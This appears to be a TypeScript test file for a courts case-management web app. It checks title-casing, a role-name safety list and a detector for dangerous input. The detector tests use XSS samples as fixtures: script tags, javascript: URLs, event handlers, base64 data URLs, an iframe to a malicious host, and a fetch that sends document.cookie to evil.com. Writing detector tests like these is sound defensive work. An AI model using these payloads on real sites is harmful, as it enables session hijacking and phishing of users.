
import { expect } from 'chai';

import { allContainOnlySafeCharacters, containsDangerousCode, toTitleCase } from './utils';

const validRoleList = [
  '[PETSOLICITOR]',
  '[RESPSOLICITOR]',
  '[BARRISTER]',
  '[CAFCASSSOLICITOR]',
  '[EPSMANAGING]',
  '[LABARRISTER]',
  '[LAMANAGING]',
  '[LASOLICITOR]',
  '[SOLICITOR]',
  '[SOLICITORA]',
  '[SOLICITORB]',
  '[SOLICITORC]',
  '[SOLICITORD]',
  '[SOLICITORE]',
  '[SOLICITORF]',
  '[SOLICITORG]',
  '[SOLICITORH]',
  '[SOLICITORI]',
  '[SOLICITORJ]',
  '[LEGALREPRESENTATIVE]',
  '[CREATOR]',
  '[CREATOR]',
  '[CREATOR]',
  '[CREATOR]',
  '[APPSOLICITOR]',
  '[CHILDSOLICITORA]',
  '[CHILDSOLICITORB]',
  '[CHILDSOLICITORC]',
  '[CHILDSOLICITORD]',
  '[CHILDSOLICITORE]',
  '[CHILDSOLICITORF]',
  '[CHILDSOLICITORG]',
  '[CHILDSOLICITORH]',
  '[CHILDSOLICITORI]',
  '[CHILDSOLICITORJ]',
  '[CHILDSOLICITORK]',
  '[CHILDSOLICITORL]',
  '[CHILDSOLICITORM]',
  '[CHILDSOLICITORN]',
  '[CHILDSOLICITORO]',
  '[LASHARED]',
  '[APPLICANTSOLICITORONE]',
  '[APPLICANTSOLICITORTWO]',
  '[RESPONDENTSOLICITORONE]',
  '[RESPONDENTSOLICITORTWO]',
  '[CLAIMANT]',
  '[CLAIMANTSOLICITOR]',
  '[DEFENDANT]',
  '[DEFENDANTSOLICITOR]',
  '[APPLICANTSOLICITOR]',
  '[OTHERPARTYSOLICITOR]',
  '[RESPONDENTSOLICITOR]',
  '[APPONESOLICITOR]',
  '[APPTWOSOLICITOR]',
  '[APPLICANTTWO]',
  '[APPLICANTSOLICITORTWOSPEC]',
  '[APPBARRISTER]',
  '[RESPBARRISTER]',
  '[INTVRSOLICITOR1]',
  '[INTVRSOLICITOR2]',
  '[INTVRSOLICITOR3]',
  '[INTVRSOLICITOR4]',
  '[INTVRBARRISTER1]',
  '[INTVRBARRISTER2]',
  '[INTVRBARRISTER3]',
  '[INTVRBARRISTER4]',
  '[C100APPLICANTSOLICITOR1]',
  '[C100APPLICANTSOLICITOR2]',
  '[C100APPLICANTSOLICITOR3]',
  '[C100APPLICANTSOLICITOR4]',
  '[C100APPLICANTSOLICITOR5]',
  '[FL401APPLICANTSOLICITOR]',
  '[C100CHILDSOLICITOR1]',
  '[C100CHILDSOLICITOR2]',
  '[C100CHILDSOLICITOR3]',
  '[C100CHILDSOLICITOR4]',
  '[C100CHILDSOLICITOR5]',
  '[C100RESPONDENTSOLICITOR1]',
  '[C100RESPONDENTSOLICITOR2]',
  '[C100RESPONDENTSOLICITOR3]',
  '[C100RESPONDENTSOLICITOR4]',
  '[C100RESPONDENTSOLICITOR5]',
  '[FL401RESPONDENTSOLICITOR]',
  'nbc-team-leader',
  'district-judge',
  'deputy-district-judge',
  'recorder',
  'allocated-nbc-caseworker',
  'case-allocator',
  'case-allocator',
  'case-allocator',
  'case-allocator',
  'case-allocator',
  'case-allocator',
  'task-supervisor',
  'task-supervisor',
  'task-supervisor',
  'task-supervisor',
  'case-allocator',
  'hmcts-judiciary',
  'hmcts-legal-operations',
  'hmcts-admin',
  'judge',
  'fee-paid-judge',
  'hearing-judge',
  'allocated-magistrate',
  'leadership-judge',
  'tribunal-caseworker',
  'tribunal-caseworker',
  'conflict-of-interest',
  'conflict-of-interest',
  'conflict-of-interest',
  'conflict-of-interest',
  'specific-access-judiciary',
  'specific-access-requested',
  'specific-access-granted',
  'specific-access-denied',
  'specific-access-legal-ops',
  'specific-access-requested',
  'specific-access-granted',
  'specific-access-denied',
  'specific-access-admin',
  'specific-access-ctsc',
  'specific-access-requested',
  'specific-access-granted',
  'specific-access-denied',
  'specific-access-requested',
  'specific-access-granted',
  'specific-access-denied',
  'challenged-access-judiciary',
  'challenged-access-legal-ops',
  'challenged-access-admin',
  'challenged-access-ctsc',
  'hearing-centre-admin',
  'national-business-centre',
  'ctsc',
  'hearing-manager',
  'hearing-manager',
  'hearing-manager',
  'hearing-manager',
  'hearing-manager',
  'hearing-viewer',
  'hearing-viewer',
  'hearing-viewer',
  'hearing-viewer',
  'hearing-viewer',
  'listed-hearing-viewer',
  'caseworker-privatelaw-externaluser-viewonly',
  'hearing-centre-team-leader',
  'senior-tribunal-caseworker',
  'circuit-judge',
  'specific-access-approver-judiciary',
  'specific-access-approver-legal-ops',
  'specific-access-approver-admin',
  'magistrate',
  'specific-access-approver-ctsc',
  'ctsc',
  'hmcts-ctsc',
  'ctsc-team-leader',
  'allocated-judge',
  'allocated-legal-adviser',
  'hearing-legal-adviser',
  'lead-judge',
  'tribunal-member-1',
  'tribunal-member-2',
  'tribunal-member-3',
  'allocated-tribunal-caseworker',
  'allocated-admin-caseworker',
  'allocated-ctsc-caseworker',
  'clerk',
  'regional-centre-team-leader',
  'regional-centre-admin',
  'senior-judge',
  'medical',
  'fee-paid-medical',
  'fee-paid-disability',
  'fee-paid-financial',
  'fee-paid-tribunal-member',
  'interloc-judge',
  'appraiser-1',
  'appraiser-2',
  'cbus-system-user',
  'tribunal-member',
  'ftpa-judge',
  'hearing-panel-judge',
  'case-manager',
  'gatekeeping-judge',
  'Role1',
  'post-hearing-judge',
  'registrar',
  'registrar',
  'dwp',
  'hmrc',
  'ibca',
  'post-hearing-salaried-judge',
  'cica',
  'allocated-legal-officer',
  'allocated-administrator'
];

describe('api utils', () => {
  describe('toTitleCase', () => {
    it('should correctly set a service name to title case', () => {
      expect(toTitleCase('')).to.equal('');
      expect(toTitleCase('ia')).to.equal('Ia');
      expect(toTitleCase('IA')).to.equal('Ia');
      expect(toTitleCase('iA')).to.equal('Ia');
      expect(toTitleCase(' iA ')).to.equal(' Ia ');
      expect(toTitleCase('4 cIvIL 14')).to.equal('4 Civil 14');
    });
  });

  describe('containsDangerousCode', () => {
    it('should match urls that do not contain dangerous characters', () => {
      expect(containsDangerousCode(null)).to.equal(false);
      const testString = '<script>alert("hello")</script>';
      expect(containsDangerousCode(testString)).to.equal(true);
      const testString2 = 'email@test.com';
      expect(containsDangerousCode(testString2)).to.equal(false);
      const testString3 = '&//?';
      expect(containsDangerousCode(testString3)).to.equal(false);
      const testString4 = '//https://www.google.com';
      expect(containsDangerousCode(testString4)).to.equal(false);
    });

    it('should return true for strings containing <script> tags', () => {
      const input = '<script>alert("XSS")</script>';
      expect(containsDangerousCode(input)).to.equal(true);

      const secondInput = 'This is random text <script>alert("XSS")</script> with script within';
      expect(containsDangerousCode(secondInput)).to.equal(true);
    });

    it('should return true for strings containing javascript: URLs', () => {
      const input = 'javascript:alert("XSS")';
      expect(containsDangerousCode(input)).to.equal(true);
    });

    it('should return true for strings containing event handlers', () => {
      const input = '<div onmouseover="alert(\'XSS\')">Hover me</div>';
      expect(containsDangerousCode(input)).to.equal(true);
    });

    it('should return true for strings containing eval function', () => {
      const input = 'eval("alert(\'XSS\')")';
      expect(containsDangerousCode(input)).to.equal(true);
    });

    it('should return true for strings containing new Function constructor', () => {
      const input = 'new Function("alert(\'XSS\')")';
      expect(containsDangerousCode(input)).to.equal(true);
    });

    it('should return true for strings containing <style> tags', () => {
      const input = '<style>body { background-color: red; }</style>';
      expect(containsDangerousCode(input)).to.equal(true);
    });

    it('should return true for strings containing CSS expressions', () => {
      const input = 'div { width: expression(alert("XSS")); }';
      expect(containsDangerousCode(input)).to.equal(true);
    });

    it('should return true for strings containing dangerous URL schemes', () => {
      const input = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=';
      expect(containsDangerousCode(input)).to.equal(true);
    });

    it('should return true for strings containing JSONP callback', () => {
      const input = 'https://example.com/api?callback=alert';
      expect(containsDangerousCode(input)).to.equal(true);
    });

    it('should return true for strings containing JSONP jsonp parameter', () => {
      const input = 'https://example.com/api?jsonp=alert';
      expect(containsDangerousCode(input)).to.equal(true);
    });

    it('should return false for safe strings', () => {
      const input = 'This is a safe string.';
      expect(containsDangerousCode(input)).to.equal(false);
    });

    it('should return false for strings with HTML but no JavaScript', () => {
      const input = '<div>This is a div</div>';
      expect(containsDangerousCode(input)).to.equal(false);
    });

    it('should return true to detect inline CSS with style= attribute', () => {
      const input = '<div style="background: url(\'javascript:alert(1)\');"></div>';
      expect(containsDangerousCode(input)).to.equal(true);
    });

    it('should return true to detect data: URLs (hiding malicious code in base64)', () => {
      const input = 'background: url("data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=")';
      expect(containsDangerousCode(input)).to.equal(true);
    });

    it('should return true to detect url(javascript:) (injecting javaScript via CSS URLs)', () => {
      const input = 'body { background: url("javascript:alert(\'XSS\')"); }';
      expect(containsDangerousCode(input)).to.equal(true);
    });

    it('should return true to detect document.cookie (session hijacking)', () => {
      const input = 'fetch(\'http://evil.com?cookie=\' + document.cookie)';
      expect(containsDangerousCode(input)).to.equal(true);
    });

    it('should return true to detect <iframe> injection (phishing)', () => {
      const input = '<iframe src="http://malicious.com"></iframe>';
      expect(containsDangerousCode(input)).to.equal(true);
    });

    it('should return true to detect dangerous javaScript functions', () => {
      const input1 = 'eval("alert(\'XSS\')");';
      expect(containsDangerousCode(input1)).to.equal(true);
      const input2 = 'document.write("<script>alert(\'Hacked\')</script>");';
      expect(containsDangerousCode(input2)).to.equal(true);
    });

    it('should return true to detect javascript: in URLs', () => {
      const input = '<a href="javascript:alert(\'XSS\')">Click me</a>';
      expect(containsDangerousCode(input)).to.equal(true);
    });

    it('should return true to detect javaScript event handlers (onerror, onclick, etc.)', () => {
      const input = '<img src="x" onerror="alert(\'XSS\')">';
      expect(containsDangerousCode(input)).to.equal(true);
    });

    it('should return true to detect <script> tags (basic XSS)', () => {
      const input = '<script>alert(\'XSS\')</script>';
      expect(containsDangerousCode(input)).to.equal(true);
    });
  });

  // todo: unignore and fix following updated list of valid characters
  describe('allContainOnlySafeCharacters', () => {
    it('should allow all valid roles possible for role assignment', () => {
      expect(allContainOnlySafeCharacters(validRoleList)).to.equal(true);
    });
  });
});
